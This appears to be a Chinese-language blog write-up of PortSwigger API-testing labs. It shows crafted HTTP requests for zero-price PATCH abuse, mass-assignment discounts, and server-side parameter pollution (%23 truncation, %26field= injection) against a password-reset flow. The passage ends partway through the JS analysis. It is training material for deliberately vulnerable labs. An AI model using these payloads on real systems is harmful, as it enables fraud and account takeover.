@@ -1,0 +1,815 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.29.1" theme-name="Stellar" theme-version="1.29.1">
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  
+  <title>PortSwigger Api Testing - sleeper</title>
+
+  
+    <meta name="description" content="Api TestingLab: Exploiting an API endpoint using documentation To solve the lab, find the exposed API documentation and delete carlos. You can log in to your own account using the following credential">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PortSwigger Api Testing">
+<meta property="og:url" content="http://example.com/2025/11/19/%E9%9D%B6%E5%9C%BA/PortSwigger/Api%20Testing/index.html">
+<meta property="og:site_name" content="sleeper">
+<meta property="og:description" content="Api TestingLab: Exploiting an API endpoint using documentation To solve the lab, find the exposed API documentation and delete carlos. You can log in to your own account using the following credential">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202511192350323.png">
+<meta property="article:published_time" content="2025-11-19T18:49:17.093Z">
+<meta property="article:modified_time" content="2025-11-24T10:38:31.760Z">
+<meta property="article:author" content="she11f">
+<meta property="article:tag" content="PortSwigger">
+<meta property="article:tag" content="Api Testing">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202511192350323.png">
+  
+  
+  
+  <meta name="keywords" content="PortSwigger,Api Testing">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.29.1">
+
+  
+    <link rel="shortcut icon" href="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/image%2Ficon.svg">
+  
+
+  
+
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC&display=swap" rel="stylesheet">-<link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@200&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/image/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">sleeper</div><div class="sub normal cap">自由而全面的发展</div><div class="sub hover cap" style="opacity:0"> Stay hungry，Stay foolish</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="探索" href="/explore/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
+</div>
+<div class="widgets">
+
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2025/03/30/%E9%9D%B6%E5%9C%BA/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ATT&CK(1)/"><span class="title">windows 内网靶场 1</span></a><a class="item title" href="/2025/11/27/%E9%9D%B6%E5%9C%BA/PortSwigger/Business%20logic%20vulnerabilities/"><span class="title">PortSwigger Business logic vulnerabilities</span></a><a class="item title" href="/2025/11/19/%E9%9D%B6%E5%9C%BA/PortSwigger/Api%20Testing/"><span class="title">PortSwigger Api Testing</span></a><a class="item title" href="/2025/11/06/%E9%9D%B6%E5%9C%BA/PortSwigger/XXE/"><span class="title">PortSwigger XXE</span></a><a class="item title" href="/2025/11/04/%E9%9D%B6%E5%9C%BA/PortSwigger/SSRF/"><span class="title">PortSwigger SSRF</span></a><a class="item title" href="/2025/10/30/%E9%9D%B6%E5%9C%BA/PortSwigger/Path%20traversal/"><span class="title">PortSwigger Path traversal</span></a><a class="item title" href="/2025/10/25/%E9%9D%B6%E5%9C%BA/PortSwigger/Access%20control/"><span class="title">PortSwigger Access control</span></a><a class="item title" href="/2025/10/15/%E9%9D%B6%E5%9C%BA/PortSwigger/Authentication/"><span class="title">PortSwigger Authentication</span></a><a class="item title" href="/2025/10/14/%E9%9D%B6%E5%9C%BA/PortSwigger/Information%20Disclosure/"><span class="title">PortSwigger Information Disclosure</span></a><a class="item title" href="/2025/09/08/%E9%9D%B6%E5%9C%BA/PortSwigger/XSS/"><span class="title">PortSwigger XSS</span></a></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/PortSwigger/">PortSwigger</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/PortSwigger/Api-Testing/">Api Testing</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-11-19T18:49:17.093Z">2025-11-19</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-11-24T10:38:31.760Z">2025-11-24</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>PortSwigger Api Testing</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="Api-Testing"><a href="#Api-Testing" class="headerlink" title="Api Testing"></a>Api Testing</h1><h3 id="Lab-Exploiting-an-API-endpoint-using-documentation"><a href="#Lab-Exploiting-an-API-endpoint-using-documentation" class="headerlink" title="Lab: Exploiting an API endpoint using documentation"></a>Lab: Exploiting an API endpoint using documentation</h3><blockquote>
+<p>To solve the lab, find the exposed API documentation and delete <code>carlos</code>. You can log in to your own account using the following credentials: <code>wiener:peter</code>.        </p>
+</blockquote>
+<p>找到 &#x2F;api 端点下的 delete 方法，可以交互，直接删除用户。</p>
+<h3 id="Lab-Finding-and-exploiting-an-unused-API-endpoint"><a href="#Lab-Finding-and-exploiting-an-unused-API-endpoint" class="headerlink" title="Lab: Finding and exploiting an unused API endpoint"></a>Lab: Finding and exploiting an unused API endpoint</h3><blockquote>
+<p>To solve the lab, exploit a hidden API endpoint to buy a <strong>Lightweight l33t Leather Jacket</strong>. You can log in to your own account using the following credentials:            <code>wiener:peter</code>.        </p>
+</blockquote>
+<p>流量包里看到 <strong>api</strong> 接口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/products/1/price</span><br></pre></td></tr></table></figure>
+
+<p>尝试修改请求方法，（我直接爆破请求方法了，答案的方法是下面这个）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OPTIONS =》 询问服务器“这个资源支持哪些操作方法”</span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202511192350323.png" alt="image-20251119234949057"></p>
+<ul>
+<li><strong>PATCH</strong>：部分更新资源（只改你传的字段）</li>
+</ul>
+<p>尝试修改为 PATCH 方法，返回 401”Unauthorized”。登录完再请求，返回 Content-Type<code>应该是 </code>application&#x2F;json，修改为 json 格式后，提示缺少 price 参数,随便给个 price 一个空值又提示要求是个整形，把 price 的值改成 0 ，发送 patch 成功0元购</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PATCH /api/products/1/price HTTP/2</span><br><span class="line">&#123;&quot;price&quot;:0&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Lab-Exploiting-a-mass-assignment-vulnerability"><a href="#Lab-Exploiting-a-mass-assignment-vulnerability" class="headerlink" title="Lab: Exploiting a mass assignment vulnerability"></a>Lab: Exploiting a mass assignment vulnerability</h3><blockquote>
+<p>To solve the lab, find and exploit a mass assignment vulnerability to buy a <strong>Lightweight l33t Leather Jacket</strong>. You can log in to your own account using the following credentials: <code>wiener:peter</code>.        </p>
+</blockquote>
+<p>批量赋值漏洞 mass assignment vulnerability</p>
+<p><strong>Mass Assignment（批量赋值）</strong>是编程框架的一个机制：</p>
+<blockquote>
+<p>自动把用户传入的 JSON 参数映射到后端对象的所有字段。</p>
+</blockquote>
+<p>很多框架为了开发方便，会自动把用户传的参数赋值到对象所有字段里。</p>
+<p>检查订单,<strong>GET &#x2F;api&#x2F;checkout</strong>,返回包</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;chosen_discount&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;percentage&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;chosen_products&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span><span class="attr">&quot;product_id&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Lightweight \&quot;l33t\&quot; Leather Jacket&quot;</span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;quantity&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;item_price&quot;</span><span class="punctuation">:</span><span class="number">133700</span><span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>提交订单 <strong>POST &#x2F;api&#x2F;checkout</strong>，请求包</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;chosen_products&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">	<span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;product_id&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;quantity&quot;</span><span class="punctuation">:</span><span class="number">1</span></span><br><span class="line">	<span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>痛殴检查订单，我们发现了一些隐藏参数，尝试手动测试后端是否存在对象批量赋值</p>
+<p>一开始我直接测了 <strong>“item_price”:133700</strong> </p>
+<p> <strong>POST &#x2F;api&#x2F;checkout</strong></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;chosen_products&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">	<span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;product_id&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;quantity&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;item_price&quot;</span><span class="punctuation">:</span><span class="number">0</span></span><br><span class="line">	<span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>失败了，但是注意到还有个 chosen_discount 折扣参数</p>
+<p> <strong>POST &#x2F;api&#x2F;checkout</strong></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;chosen_discount&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;percentage&quot;</span><span class="punctuation">:</span><span class="number">100</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;chosen_products&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">	<span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;product_id&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;quantity&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;item_price&quot;</span><span class="punctuation">:</span><span class="number">0</span></span><br><span class="line">	<span class="punctuation">&#125;</span></span><br><span class="line">			<span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>成功赋值，实现0元购。</p>
+<h3 id="Lab-Exploiting-server-side-parameter-pollution-in-a-query-string"><a href="#Lab-Exploiting-server-side-parameter-pollution-in-a-query-string" class="headerlink" title="Lab: Exploiting server-side parameter pollution in a query string"></a>Lab: Exploiting server-side parameter pollution in a query string</h3><blockquote>
+<p>To solve the lab, log in as the <code>administrator</code> and delete <code>carlos</code>.        </p>
+</blockquote>
+<p>这一小节讲了一个这样的知识点 &#x3D;&gt; <strong>Server-side parameter pollution</strong>(sspp，服务器端参数污染 )</p>
+<ol>
+<li><p><strong>Truncating query strings</strong> (截断查询字符串 )</p>
+<p>假设有一个查询个人信息接口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /userSearch?name=peter&amp;back=/home</span><br></pre></td></tr></table></figure>
+
+<p>发送到后端后，为了检索用户信息，服务器会向内网API 发送以下请求：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /users/search?name=peter&amp;publicProfile=true</span><br></pre></td></tr></table></figure>
+
+<p>只能查到 public 权限下的个人信息，也就是一些不敏感的数据。</p>
+<p>那么<strong>能不能通过构造特殊输入，让后端向内部 API 发的请求被截断？</strong>比如让后端实际发出的请求变成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /users/search?name=peter</span><br></pre></td></tr></table></figure>
+
+<p>这样就没有 &amp;publicProfile&#x3D;true 这个参数了。<strong>如果 publicProfile 不再强制为 true，就可能查看私密用户信息</strong></p>
+<p>有的兄弟，有的。我们都知道 url 查询中 # 片段标识符及其之后的值是不会传给后端的（当然也不是绝对的，只是规范是这样规范的，要看api还有编程语言，框架，程序员怎么设计）</p>
+<p>​    例如，您可以将查询字符串修改为以下内容： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /userSearch?name=peter%23&amp;back=/home</span><br></pre></td></tr></table></figure>
+
+<p>​    后端将尝试访问以下api： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /users/search?name=peter#&amp;publicProfile=true</span><br></pre></td></tr></table></figure>
+
+<p>所以内网 api API 实际能收到的就只有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/users/search?name=peter</span><br></pre></td></tr></table></figure>
+
+<p>等于你把 &amp;publicProfile&#x3D;true <strong>截断掉了</strong>！为什么要 url 编码那不编码的话第一次前端发送给后端那一下就截断了肯定是不行的，要留到最后那一下触发截断。</p>
+</li>
+<li><p><strong>Injecting parameters</strong>(注入参数)</p>
+</li>
+</ol>
+<p>这个的话就是想拼接参数到内网api执行了。</p>
+<p>还是那两个接口，假如我们想让服务器加一个 email 参数请求到内网 api ，想看看有什么返回。那么可以按如下方式将参数添加到查询字符串中： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /userSearch?name=peter%26email=foo&amp;back=/home</span><br></pre></td></tr></table></figure>
+
+<p>这样，后端再发给内网 API</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /users/search?name=peter&amp;email=foo&amp;publicProfile=true</span><br></pre></td></tr></table></figure>
+
+<p>然后查看响应，寻找有关如何解析附加参数的线索。 </p>
+<p>这道题我们在找回密码那里先拼接一个 %23 尝试截断</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csrf=kg0OM3dMuziACnBTabuddefMrmsYga4g&amp;username=administrator%23</span><br></pre></td></tr></table></figure>
+
+<p>返回 <strong>Field not specified</strong></p>
+<p>再尝试一下 %26x&#x3D;1</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csrf=kg0OM3dMuziACnBTabuddefMrmsYga4g&amp;username=administrator%26x=1</span><br></pre></td></tr></table></figure>
+
+<p>返回 <strong>Parameter is not supported</strong></p>
+<p>这就说明了后端把 <strong>x</strong> 当成参数了，不然就返回没有这个用户了，所以这里肯定是存在 <strong>sspp</strong> 漏洞的。在结合 %23 的返回猜一下后端给api的请求上有一个 field 参数，因为被截断所以报错 。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=administrator%26field=x</span><br></pre></td></tr></table></figure>
+
+<p>返回，<strong>Invalid field</strong></p>
+<p>注入成功，但是 x 是无效字段，尝试改为 username返回</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">username=administrator%<span class="number">26</span>field=username</span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;username&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;result&quot;</span><span class="punctuation">:</span><span class="string">&quot;administrator&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>哦豁，好像发现了点什么，尝试 email</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">username=administrator%<span class="number">26</span>field=email</span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;email&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;result&quot;</span><span class="punctuation">:</span><span class="string">&quot;*****@normal-user.net&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个就跟我们程序接口发的请求 <strong>csrf&#x3D;kg0OM3dMuziACnBTabuddefMrmsYga4g&amp;username&#x3D;administrator</strong> 得到的返回一样了</p>
+<p>我猜测，找回密码处后端发到内网api那一段是这样拼接的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET username=administrator&amp;field=email</span><br></pre></td></tr></table></figure>
+
+<p>但是这样又如何呢，我试了没有 password 字段，也不能直接设置 email&#x3D;xxx 让重置密码邮件发到我的账户里。</p>
+<p>所谓七步之内必有解药，我们查看 <strong>forgotPassword.js</strong> </p>
+<p>我果然还是不熟悉开发流程，没有这种敏感性，只能问 gpt 里。</p>
+<p>js 分为两个判断</p>
+<ol>
+<li><p>自动识别密码重置链接中的 reset-token 并跳转、用于邮件链接的情况。用户点开邮件里的重置链接：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> queryString = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>;</span><br><span class="line">    <span class="keyword">const</span> urlParams = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(queryString);</span><br><span class="line">    <span class="keyword">const</span> resetToken = urlParams.<span class="title function_">get</span>(<span class="string">&#x27;reset-token&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (resetToken)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">`/forgot-password?reset_token=<span class="subst">$&#123;resetToken&#125;</span>`</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
